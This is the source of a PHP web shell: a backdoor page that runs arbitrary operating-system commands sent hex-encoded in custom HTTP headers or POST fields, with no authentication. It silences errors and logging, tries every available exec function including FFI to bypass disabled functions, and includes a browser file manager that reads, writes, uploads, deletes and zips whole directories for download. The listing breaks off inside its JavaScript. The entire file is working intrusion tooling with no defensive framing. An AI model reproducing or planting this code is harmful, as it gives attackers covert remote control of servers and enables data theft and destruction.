<?php
@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

function exec_candidates() {
    return array('shell_exec','system','passthru','exec','popen','proc_open','pcntl_exec','ffi','expect');
}

function exec_usable($c) {
    if ($c === '') return false;
    if (!@function_exists($c)) return false;
    if ($c === 'pcntl_exec' && PHP_SAPI !== 'cli') return false;
    if ($c === 'ffi' && !@extension_loaded('ffi')) return false;
    if ($c === 'expect' && !@extension_loaded('expect')) return false;
    return true;
}

function exec_best() {
    static $cached = null;
    if ($cached !== null) return $cached;
    foreach (exec_candidates() as $c) {
        if (exec_usable($c)) return $cached = $c;
    }
    return $cached = '';
}

function run_cmd($cmd) {
    $fn = exec_best();
    if ($fn === '') return null;
    switch ($fn) {
        case 'shell_exec': return (string) @shell_exec($cmd);
        case 'system':     ob_start(); @system($cmd);   return ob_get_clean();
        case 'passthru':   ob_start(); @passthru($cmd); return ob_get_clean();
        case 'exec':       $o = array(); @exec($cmd, $o); return implode("\n", $o);
        case 'popen':
            $h = @popen($cmd, 'r'); if (!$h) return '';
            $out = ''; while (!@feof($h)) $out .= @fread($h, 8192); @pclose($h); return $out;
        case 'proc_open':
            $d = array(1 => array('pipe','w'), 2 => array('pipe','w'));
            $p = @proc_open($cmd, $d, $pipes);
            if (!is_resource($p)) return '';
            $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $out;
    }
    return '';
}
function is_win() { return DIRECTORY_SEPARATOR === '\\'; }

function sq($s) {
    if (is_win()) return '"' . str_replace('"', '""', $s) . '"';
    return "'" . str_replace("'", "'\\''", $s) . "'";
}
function ps_sq($s) { return "'" . str_replace("'", "''", $s) . "'"; }

function run_ps($script) {
    $tmp = @tempnam(@sys_get_temp_dir(), 'ps');
    if (!$tmp) return null;
    if (@file_put_contents($tmp, $script) === false) { @unlink($tmp); return null; }
    $out = run_cmd('powershell -NoProfile -ExecutionPolicy Bypass -File ' . sq($tmp));
    @unlink($tmp);
    return $out;
}

function json_out($data, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store');
    $flags = 0;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    $json = @json_encode($data, $flags);
    if ($json === false) $json = '{"ok":false,"error":"json encode failed"}';
    echo $json;
    exit;
}

function path_join($base, $name) {
    $sep = (strpos($base, '\\') !== false && strpos($base, '/') === false) ? '\\' : '/';
    return rtrim($base, "/\\") . $sep . $name;
}
function output_debug_report() {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    echo "PHP_VERSION       = " . PHP_VERSION . "\n";
    echo "PHP_SAPI          = " . PHP_SAPI . "\n";
    echo "OS_FAMILY         = " . PHP_OS_FAMILY . "\n";
    echo "disable_functions = " . (@ini_get('disable_functions') ?: '(none)') . "\n";
    echo "open_basedir      = " . (@ini_get('open_basedir') ?: '(none)') . "\n";
    echo "zip ext           = " . (class_exists('ZipArchive') ? 'yes' : 'no') . "\n";
    echo "--- function check ---\n";
    $usable = array();
    foreach (exec_candidates() as $c) {
        $u = exec_usable($c);
        printf("%-12s exists=%s usable=%s\n", $c, @function_exists($c) ? 'yes' : 'no', $u ? 'YES' : 'no');
        if ($u) $usable[] = $c;
    }
    echo "--- usable ---\n";
    if ($usable) {
        echo "auto-selected: " . exec_best() . "\n";
    } else {
        echo "[!] no exec function available on this server.\n";
        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
        echo "    are disabled or missing.\n";
        echo "    use the file manager instead.\n";
    }
    exit;
}
function fm_list($path) {
    if ($path === '' || $path === null) $path = @getcwd();
    $entries = array();
    $mode = 'native';
    $err = '';

    if (exec_best() !== '') {
        if (is_win()) {
            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction Stop | ' .
                  'ForEach-Object { $_.PSIsContainer.ToString() + "|" + $_.Length + "|" + ' .
                  '$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "|" + $_.Name }';
            $out = run_ps($ps);
            if (is_string($out) && trim($out) !== '') {
                $parsed = 0;
                foreach (explode("\n", trim($out)) as $line) {
                    $line = rtrim($line, "\r");
                    if ($line === '') continue;
                    $p = explode('|', $line, 4);
                    if (count($p) < 4) continue;
                    $entries[] = array(
                        'name'  => $p[3],
                        'type'  => (strcasecmp($p[0], 'True') === 0) ? 'dir' : 'file',
                        'size'  => (int)$p[1],
                        'mtime' => $p[2],
                    );
                    $parsed++;
                }
                if ($parsed > 0) $mode = 'cmd';
            }
        } else {
            $q = sq($path);
            $out = run_cmd("find $q -maxdepth 1 -mindepth 1 -printf '%y|%s|%TY-%Tm-%Td %TH:%TM:%TS|%f\\n'");
            if (is_string($out) && trim($out) !== '') {
                $parsed = 0;
                foreach (explode("\n", trim($out)) as $line) {
                    if ($line === '') continue;
                    $p = explode('|', $line, 4);
                    if (count($p) < 4) continue;
                    $t = $p[0];
                    $type = ($t === 'd') ? 'dir' : (($t === 'l') ? 'link' : 'file');
                    $entries[] = array(
                        'name'  => $p[3],
                        'type'  => $type,
                        'size'  => (int)$p[1],
                        'mtime' => substr($p[2], 0, 19),
                    );
                    $parsed++;
                }
                if ($parsed > 0) $mode = 'cmd';
            }
        }
    }

    if ($mode !== 'cmd' && function_exists('scandir')) {
        $items = @scandir($path);
        if ($items === false) {
            $err = 'cannot list directory (open_basedir / permissions)';
        } else {
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') continue;
                $full = path_join($path, $it);
                $st = @stat($full);
                $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
                $entries[] = array(
                    'name'  => $it,
                    'type'  => $type,
                    'size'  => $st ? (int)$st['size'] : 0,
                    'mtime' => $st ? date('Y-m-d H:i:s', $st['mtime']) : '',
                );
            }
        }
    } elseif ($mode !== 'cmd') {
        $err = 'scandir unavailable';
    }

    usort($entries, function ($a, $b) {
        if ($a['type'] !== $b['type']) return ($a['type'] === 'dir') ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });

    return array('ok' => $err === '', 'mode' => $mode, 'path' => $path, 'entries' => $entries, 'error' => $err);
}

function fm_read($path, $max = 2097152) {
    if (!@is_file($path)) return array('ok' => false, 'error' => 'not a file');
    $sz = @filesize($path);
    if ($sz === false) return array('ok' => false, 'error' => 'cannot stat file');
    if ($sz > $max) return array('ok' => false, 'error' => 'file too large: ' . $sz . ' bytes (max ' . $max . ')');
    $data = @file_get_contents($path);
    if ($data === false) return array('ok' => false, 'error' => 'read failed');
    return array('ok' => true, 'content' => $data, 'binary' => (strpos($data, "\0") !== false), 'size' => $sz);
}

function fm_write($path, $content) {
    $r = @file_put_contents($path, $content);
    if ($r !== false) return array('ok' => true, 'bytes' => $r);
    $f = @fopen($path, 'wb');
    if (!$f) return array('ok' => false, 'error' => 'cannot open for writing');
    $r = @fwrite($f, $content);
    @fclose($f);
    if ($r === false) return array('ok' => false, 'error' => 'write failed');
    return array('ok' => true, 'bytes' => $r);
}

function fm_rename($from, $to) {
    if (exec_best() !== '') {
        $cmd = is_win() ? "move /Y " . sq($from) . " " . sq($to) : "mv -f " . sq($from) . " " . sq($to);
        run_cmd($cmd);
        if (@file_exists($to)) return array('ok' => true, 'mode' => 'cmd');
    }
    if (@rename($from, $to)) return array('ok' => true, 'mode' => 'native');
    return array('ok' => false, 'error' => 'rename failed');
}

function fm_rmdir_rec($dir) {
    if (!@is_dir($dir)) return false;
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $p = path_join($dir, $it);
        if (@is_dir($p) && !@is_link($p)) fm_rmdir_rec($p);
        else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_delete_one($p) {
    if (exec_best() !== '') {
        $q = sq($p);
        $cmd = is_win()
            ? (@is_dir($p) ? "rd /s /q $q" : "del /f /q $q")
            : "rm -rf $q";
        run_cmd($cmd);
        if (!@file_exists($p)) return 'cmd';
    }
    if (@is_dir($p) && !@is_link($p)) {
        if (fm_rmdir_rec($p)) return 'native';
    } else {
        if (@unlink($p)) return 'native';
    }
    return false;
}

function fm_mkdir($path) {
    if (exec_best() !== '') {
        run_cmd((is_win() ? "mkdir " : "mkdir -p ") . sq($path));
        if (@is_dir($path)) return array('ok' => true, 'mode' => 'cmd');
    }
    if (@mkdir($path, 0755, true)) return array('ok' => true, 'mode' => 'native');
    return array('ok' => false, 'error' => 'mkdir failed');
}
function fm_download($path) {
    if (@is_file($path)) {
        $name = str_replace(array('"', "\r", "\n"), '', basename($path));
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $name . '"');
        $sz = @filesize($path);
        if ($sz !== false) header('Content-Length: ' . $sz);
        header('Cache-Control: no-store');
        if (function_exists('readfile')) { @readfile($path); exit; }
        $f = @fopen($path, 'rb');
        if ($f) { while (!@feof($f)) echo @fread($f, 8192); @fclose($f); }
        exit;
    }
    if (@is_dir($path)) {
        if (!class_exists('ZipArchive')) {
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'ZipArchive extension not available on this server';
            exit;
        }

        $tmp = @tempnam(@sys_get_temp_dir(), 'zip');
        if (!$tmp) {
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'cannot create temp file';
            exit;
        }

        $zip = new ZipArchive();
        if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            @unlink($tmp);
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'cannot create zip archive';
            exit;
        }

        $root = rtrim(str_replace('\\', '/', $path), '/');
        $base = basename($root);
        if ($base === '' || $base === '.' || $base === '..') $base = 'archive';
        $prefix = $base;
        $zip->addEmptyDir($prefix);

        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $item) {
                if ($item->isLink()) continue;   /* skip symlinks: avoid loops/escapes */
                $real = str_replace('\\', '/', $item->getPathname());
                $rel  = ltrim(substr($real, strlen($root)), '/');
                if ($rel === '') continue;
                $inZip = $prefix . '/' . $rel;
                if ($item->isDir()) {
                    $zip->addEmptyDir($inZip);
                } else {
                    @$zip->addFile($item->getPathname(), $inZip);
                }
            }
        } catch (Exception $e) {
        }

        @$zip->close();

        $zipName = $prefix . '.zip';
        $sz = @filesize($tmp);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipName . '"');
        if ($sz !== false) header('Content-Length: ' . $sz);
        header('Cache-Control: no-store');
        if (function_exists('readfile')) {
            @readfile($tmp);
            @unlink($tmp);
            exit;
        }
        $f = @fopen($tmp, 'rb');
        if ($f) { while (!@feof($f)) echo @fread($f, 8192); @fclose($f); }
        @unlink($tmp);
        exit;
    }

    /* ---- nothing ---- */
    http_response_code(404);
    echo 'not found';
    exit;
}
function handle_file_op($hex) {
    $raw = @hex2bin($hex);
    if ($raw === false) json_out(array('ok' => false, 'error' => 'bad hex'), 400);
    $req = @json_decode($raw, true);
    if (!is_array($req) || empty($req['op'])) json_out(array('ok' => false, 'error' => 'bad json'), 400);

    switch ($req['op']) {
        case 'list':
            json_out(fm_list(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'read':
            json_out(fm_read(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'write':
            json_out(fm_write(
                isset($req['path']) ? $req['path'] : '',
                isset($req['content']) ? $req['content'] : ''
            ));
            break;
        case 'upload':
            $path = isset($req['path']) ? $req['path'] : '';
            if ($path === '') json_out(array('ok' => false, 'error' => 'no path'), 400);
            $body = isset($_POST['u']) ? $_POST['u'] : '';
            if ($body === '' || !@ctype_xdigit($body)) json_out(array('ok' => false, 'error' => 'no content'), 400);
            $data = @hex2bin($body);
            if ($data === false) json_out(array('ok' => false, 'error' => 'bad hex'), 400);
            json_out(fm_write($path, $data));
            break;
        case 'rename':
            json_out(fm_rename(
                isset($req['from']) ? $req['from'] : '',
                isset($req['to']) ? $req['to'] : ''
            ));
            break;
        case 'delete':
            $paths = isset($req['paths']) ? $req['paths'] : array();
            if (!is_array($paths) || !$paths) json_out(array('ok' => false, 'error' => 'no paths'), 400);
            $deleted = array(); $failed = array();
            foreach ($paths as $p) {
                if (fm_delete_one($p)) $deleted[] = $p; else $failed[] = $p;
            }
            json_out(array('ok' => count($failed) === 0, 'deleted' => $deleted, 'failed' => $failed));
            break;
        case 'mkdir':
            json_out(fm_mkdir(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'download':
            fm_download(isset($req['path']) ? $req['path'] : '');
            break;
        case 'info':
            $fns = array();
            foreach (exec_candidates() as $c) $fns[$c] = exec_usable($c);
            json_out(array(
                'ok'        => true,
                'cwd'       => @getcwd(),
                'os'        => is_win() ? 'windows' : 'posix',
                'php'       => PHP_VERSION,
                'sapi'      => PHP_SAPI,
                'exec_fn'   => exec_best(),
                'disabled'  => @ini_get('disable_functions') ?: '(none)',
                'functions' => $fns,
                'openbase'  => @ini_get('open_basedir') ?: '(none)',
                'zip'       => class_exists('ZipArchive'),
            ));
            break;
        default:
            json_out(array('ok' => false, 'error' => 'unknown op'), 400);
    }
}
function handle_console($raw) {
    $fn = ''; $cmd = '';
    $pos = @strpos($raw, ':');
    if ($pos !== false) {
        $fn  = @hex2bin(substr($raw, 0, $pos));
        $cmd = @hex2bin(substr($raw, $pos + 1));
    } else {
        $cmd = @hex2bin($raw);
    }

    if (exec_best() === '') {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store');
        echo "[!] no exec function available on this server.\n";
        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
        echo "    are disabled or missing.\n";
        echo "    use the file manager instead.\n";
        exit;
    }

    if (!is_string($cmd) || $cmd === '') {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store');
        echo "bad payload: hex decode failed (check hex2bin availability).";
        exit;
    }

    if ($fn === '' || !exec_usable($fn)) {
        $fn = '';
        foreach (exec_candidates() as $c) if (exec_usable($c)) { $fn = $c; break; }
    }
    if ($fn === '') {
        header('Content-Type: text/plain; charset=utf-8');
        echo "no exec fn";
        exit;
    }

    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');

    $out = '';
    switch ($fn) {
        case 'shell_exec': $out = (string) @shell_exec($cmd); break;
        case 'system':     ob_start(); @system($cmd);   $out = ob_get_clean(); break;
        case 'passthru':   ob_start(); @passthru($cmd); $out = ob_get_clean(); break;
        case 'exec':
            $o = array(); @exec($cmd, $o); $out = implode("\n", $o);
            break;
        case 'popen':
            $h = @popen($cmd, 'r');
            if ($h) { while (!@feof($h)) $out .= @fread($h, 4096); @pclose($h); }
            break;
        case 'proc_open':
            $d = array(1=>array('pipe','w'), 2=>array('pipe','w'));
            $p = @proc_open($cmd, $d, $pipes);
            if (is_resource($p)) {
                $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
                @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p);
            }
            break;
        case 'pcntl_exec':
            @pcntl_exec('/bin/sh', array('-c', $cmd));
            break;
        case 'ffi':
            $lib = PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
            $f = @FFI::cdef("int system(const char *);", $lib);
            if ($f) { @$f->system($cmd); }
            break;
    }
    if ($out === '' || $out === false || $out === null) {
        echo "(executed via $fn, no output)";
    } else {
        echo $out;
    }
    exit;
}
if (!empty($_SERVER['HTTP_X_DEBUG'])) {
    output_debug_report();
}

$hexF = '';
if (!empty($_SERVER['HTTP_X_F']) && @ctype_xdigit($_SERVER['HTTP_X_F'])) {
    $hexF = $_SERVER['HTTP_X_F'];
} elseif (!empty($_POST['f']) && @ctype_xdigit($_POST['f'])) {
    $hexF = $_POST['f'];
}
if ($hexF !== '') handle_file_op($hexF);

$raw = '';
foreach (array('HTTP_X_R', 'HTTP_X_TOKEN', 'HTTP_X_C') as $k) {
    if (!empty($_SERVER[$k])) { $raw = $_SERVER[$k]; break; }
}
if ($raw === '' && isset($_POST['r'])) $raw = $_POST['r'];
if ($raw !== '' && @ctype_xdigit(str_replace(':', '', $raw))) handle_console($raw);

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');
render_ui();
function render_ui() {
echo <<<'HTMLEOF'
<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>console</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { font: 13px/1.45 ui-monospace, Consolas, monospace;
         background:#0e0e10; color:#d8d8d8; margin:0; padding:18px; }
  h1 { font-size:14px; font-weight:600; margin:0 0 12px; color:#9ad; letter-spacing:.5px; }
  h1 span { font-weight:400; font-size:11px; color:#666; margin-left:8px; }
  .row { display:flex; gap:8px; margin-bottom:10px; align-items:center; flex-wrap:wrap; }
  input,select,button,textarea {
      font:inherit; background:#18181b; color:#e6e6e6;
      border:1px solid #2a2a30; border-radius:6px; padding:7px 10px; outline:none; }
  input:focus,select:focus,textarea:focus { border-color:#4a6fa5; }
  button { cursor:pointer; background:#1f2937; }
  button:hover { background:#273449; }
  button:active { transform:translateY(1px); }
  #out { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
         color:#7ee787; padding:12px; min-height:160px; max-height:50vh;
         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px; }
  .meta { color:#666; font-size:11.5px; }
  hr { border:0; border-top:1px solid #1e1e24; margin:20px 0; }

  #c { flex:1 1 520px; min-width:300px; }

  #fmPathRow .path-wrap { flex:1 1 100%; display:flex; gap:8px; }
  #fmPathRow .path-wrap #fmPath { flex:1 1 auto; min-width:0; }

  #fmWrap { max-height:55vh; overflow:auto; border:1px solid #1e1e24; border-radius:6px; }
  #fmTable { width:100%; border-collapse:collapse; table-layout:fixed; font-size:12.5px; }
  #fmTable th, #fmTable td { text-align:left; padding:6px 8px;
      border-bottom:1px solid #1e1e24; overflow:hidden; text-overflow:ellipsis; }
  #fmTable th { color:#9ad; font-weight:600; background:#141418; position:sticky; top:0; z-index:1; }
  #fmTable tr:hover td { background:#14141a; }
  #fmTable td.name { white-space:nowrap; }
  #fmTable td.actions { white-space:nowrap; padding-right:10px; }
  #fmTable td.actions button { padding:3px 7px; font-size:11.5px; margin-right:4px; }
  #fmTable td.actions button:last-child { margin-right:0; }
  #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
  #fmTable a.fmLink:hover { text-decoration:underline; }

  #modal { position:fixed; inset:0; background:rgba(0,0,0,.65);
           display:none; align-items:center; justify-content:center; z-index:10; }
  #modal.open { display:flex; }
  .modal-box { background:#141418; border:1px solid #2a2a30; border-radius:8px;
           width:min(900px, 92vw); height:min(80vh, 720px);
           display:flex; flex-direction:column; padding:12px; }
  .modal-head { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-bottom:8px; color:#9ad; }
  .modal-foot { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-top:8px; }
  #modalText { flex:1; width:100%; background:#08080a; color:#7ee787;
           border:1px solid #1e1e24; border-radius:6px; padding:10px;
           font:12.5px/1.4 ui-monospace, Consolas, monospace; resize:none; outline:none; }
  #modalText[readonly] { color:#cfcfcf; }
</style>

<h1>console</h1>
<div class="row">
  <select id="fn">
    <option value="">auto</option>
    <option>shell_exec</option><option>system</option><option>passthru</option>
    <option>exec</option><option>popen</option><option>proc_open</option>
    <option>pcntl_exec</option><option>ffi</option>
  </select>
  <input id="c" placeholder="command (id / whoami / dir / uname -a)" autofocus>
  <button onclick="run()">run</button>
  <button onclick="info()">server info</button>
  <button onclick="document.getElementById('out').textContent='';">clear</button>
</div>
<div id="out">loading...</div>
<div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>

<hr>

<h1>files <span id="fmMode"></span></h1>

<div class="row" id="fmPathRow">
  <button onclick="fmUp()">up</button>
  <button onclick="fmHome()">cwd</button>
  <button onclick="fmMkdir()">new folder</button>
  <button onclick="fmNewFile()">new file</button>
  <button onclick="fmUpload()">upload</button>
  <div class="path-wrap">
    <input id="fmPath" placeholder="/path/to/dir">
    <button onclick="fmGo()">go</button>
    <button onclick="fmRefresh()">refresh</button>
  </div>
</div>

<div class="row">
  <button onclick="fmDownloadSelected()">download selected</button>
  <button onclick="fmDeleteSelected()">delete selected</button>
  <span id="fmStatus" class="meta"></span>
</div>

<div id="fmWrap">
<table id="fmTable">
  <colgroup>
    <col style="width:34px">
    <col>
    <col style="width:60px">
    <col style="width:80px">
    <col style="width:150px">
    <col style="width:220px">
  </colgroup>
  <thead>
    <tr>
      <th><input type="checkbox" id="fmAll" onchange="fmToggleAll(this)"></th>
      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>
</div>

<div id="modal">
  <div class="modal-box">
    <div class="modal-head">
      <span id="modalTitle">edit</span>
      <button onclick="modalClose()">x</button>
    </div>
    <textarea id="modalText" spellcheck="false"></textarea>
    <div class="modal-foot">
      <span id="modalStatus" class="meta"></span>
      <div id="modalActions"></div>
    </div>
  </div>
</div>

<script>
const $ = s => document.querySelector(s);
const hex = s => [...new TextEncoder().encode(s)]
                  .map(b => b.toString(16).padStart(2, '0')).join('');
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;')
  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');

async function timedFetch(url, opts) {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 120000);
  try {
    return await fetch(url, Object.assign({ signal: ctl.signal }, opts || {}));
  } finally {
    clearTimeout(timer);
  }
}

async function callConsole(headers) {
  const r = await timedFetch(location.pathname, { method:'POST', headers });
  return await r.text();
}
async function run() {
  const cmd = $('#c').value;
  if (!cmd) return;
  const fn = $('#fn').value;
  const payload = fn ? hex(fn) + ':' + hex(cmd) : hex(cmd);
  $('#out').textContent = '...';
  try {
    const t = await callConsole({ 'X-R': payload });
    $('#out').textContent = t || '(empty)';
  } catch (e) {
    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}
async function info() {
  $('#out').textContent = '...';
  try {
    const t = await callConsole({ 'X-Debug': '1' });
    $('#out').textContent = t;
  } catch (e) {
    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}
$('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });

let fmCwd = '';
let fmEntries = [];

async function fmCall(op, params) {
  const req = Object.assign({ op }, params || {});
  const payload = hex(JSON.stringify(req));
  if (payload.length < 4000) {
    return await timedFetch(location.pathname, { method:'POST', headers:{ 'X-F': payload } });
  }
  return await timedFetch(location.pathname, {
    method:'POST',
    headers:{ 'Content-Type':'application/x-www-form-urlencoded' },
    body: 'f=' + payload
  });
}
async function fmJson(op, params) {
  try {
    const r = await fmCall(op, params);
    return await r.json();
  } catch (e) {
    return { ok: false, error: e.name === 'AbortError' ? 'timeout' : 'request failed' };
  }
}
function fmtSize(n) {
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n/1024).toFixed(1) + ' K';
  if (n < 1073741824) return (n/1048576).toFixed(1) + ' M';
  return (n/1073741824).toFixed(1) + ' G';
}
function pathJoin(base, name) {
  const sep = (base.indexOf('\\') !== -1 && base.indexOf('/') === -1) ? '\\' : '/';
  return base.replace(/[\\\/]+$/,'') + sep + name;
}
function pathParent(p) {
  p = p.replace(/[\\\/]+$/, '');
  if (/^[A-Za-z]:$/.test(p)) return p + '\\';
  const i = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  if (i <= 0) return p.slice(0, 1) || '/';
  return p.slice(0, i);
}

function fmRender() {
  const tb = $('#fmTable tbody');
  tb.innerHTML = '';
  for (const e of fmEntries) {
    const full = pathJoin(fmCwd, e.name);
    const isDir = e.type === 'dir';
    const tr = document.createElement('tr');
    tr.dataset.path = full;
    const nameCell = isDir
      ? '<a class="fmLink">' + esc(e.name) + '/</a>'
      : esc(e.name);
    const acts = (isDir ? '<button data-act="dl">dl</button>' :
        '<button data-act="view">view</button>' +
        '<button data-act="edit">edit</button>' +
        '<button data-act="dl">dl</button>') +
      '<button data-act="rn">rn</button>' +
      '<button data-act="rm">rm</button>';
    tr.innerHTML =
      '<td><input type="checkbox" class="fmSel"></td>' +
      '<td class="name">' + nameCell + '</td>' +
      '<td>' + esc(e.type) + '</td>' +
      '<td>' + (isDir ? '-' : fmtSize(e.size)) + '</td>' +
      '<td>' + esc(e.mtime) + '</td>' +
      '<td class="actions">' + acts + '</td>';
    tb.appendChild(tr);
  }
  $('#fmPath').value = fmCwd;
}

async function fmLoad(path) {
  $('#fmStatus').textContent = 'loading...';
  const r = await fmJson('list', { path });
  if (!r.ok) { $('#fmStatus').textContent = 'error: ' + (r.error || '?'); return; }
  fmCwd = r.path;
  fmEntries = r.entries;
  $('#fmMode').textContent = '[mode: ' + r.mode + ']';
  fmRender();
  $('#fmStatus').textContent = fmEntries.length + ' item(s)';
}

function fmGo() { fmLoad($('#fmPath').value); }
function fmRefresh() { fmLoad(fmCwd); }
function fmUp() { fmLoad(pathParent(fmCwd)); }

function fnSummary(r) {
  const list = [];
  if (r.functions) for (const k in r.functions) if (r.functions[k]) list.push(k);
  return list.length ? list.join(',') : '(none)';
}

async function fmHome() {
  const r = await fmJson('info');
  if (r.ok) {
    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
    fmLoad(r.cwd);
  }
}
async function fmInit() {
  const r = await fmJson('info');
  if (!r.ok) { $('#fmStatus').textContent = 'init failed'; return; }
  $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
  fmLoad(r.cwd);
}

function fmToggleAll(cb) {
  document.querySelectorAll('.fmSel').forEach(x => x.checked = cb.checked);
}
function fmSelected() {
  return [...document.querySelectorAll('#fmTable tbody tr')]
    .filter(tr => tr.querySelector('.fmSel') && tr.querySelector('.fmSel').checked)
    .map(tr => tr.dataset.path);
}

$('#fmTable tbody').addEventListener('click', e => {
  const link = e.target.closest('a.fmLink');
  if (link) {
    const tr = link.closest('tr');
    if (tr) fmLoad(tr.dataset.path);
    return;
  }
  const btn = e.target.closest('button[data-act]');
  if (!btn) return;
  const tr = btn.closest('tr');
  if (!tr) return;
  const path = tr.dataset.path;
  const act = btn.dataset.act;
  if (act === 'view') fmView(path);
  else if (act === 'edit') fmEdit(path);
  else if (act === 'dl') fmDownload(path);
  else if (act === 'rn') fmRename(path);
  else if (act === 'rm') fmDeleteOne(path);
});

async function fmView(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'view: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = true;
  $('#modalStatus').textContent = r.size + ' bytes' + (r.binary ? ' (binary)' : '');
  $('#modalActions').innerHTML = '';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'view';
}

async function fmEdit(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'edit: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = false;
  $('#modalStatus').textContent = r.size + ' bytes';
  $('#modalActions').innerHTML = '<button onclick="modalSave()">save</button>';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'edit';
}

async function modalSave() {
  if ($('#modal').dataset.mode !== 'edit') { modalClose(); return; }
  const path = $('#modal').dataset.path;
  const content = $('#modalText').value;
  $('#modalStatus').textContent = 'saving...';
  const r = await fmJson('write', { path, content });
  if (r.ok) {
    $('#modalStatus').textContent = 'saved ' + r.bytes + ' bytes';
    setTimeout(modalClose, 400);
  } else {
    $('#modalStatus').textContent = 'error: ' + r.error;
  }
}

function modalClose() {
  $('#modal').classList.remove('open');
  $('#modal').dataset.path = '';
  $('#modal').dataset.mode = '';
  $('#modalActions').innerHTML = '';
}

async function fmRename(path) {
  const oldName = path.split(/[\\\/]/).pop();
  const newName = prompt('rename to:', oldName);
  if (!newName || newName === oldName) return;
  const to = path.slice(0, path.length - oldName.length) + newName;
  const r = await fmJson('rename', { from: path, to });
  if (!r.ok) alert('rename failed: ' + r.error);
  fmRefresh();
}

async function fmDeleteOne(path) {
  if (!confirm('delete:\n' + path)) return;
  const r = await fmJson('delete', { paths: [path] });
  if (!r.ok) alert('delete failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmDownload(path) {
  const r = await fmCall('download', { path });
  if (!r.ok) { alert('download failed'); return; }
  const blob = await r.blob();
  const cd = r.headers.get('Content-Disposition') || '';
  let name = path.split(/[\\\/]/).pop();
  const m = cd.match(/filename="([^"]+)"/);
  if (m) name = m[1];
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}

async function fmDownloadSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  for (const p of sel) {
    await fmDownload(p);
    await new Promise(r => setTimeout(r, 300));
  }
}

async function fmDeleteSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  if (!confirm('delete ' + sel.length + ' item(s)?')) return;
  const r = await fmJson('delete', { paths: sel });
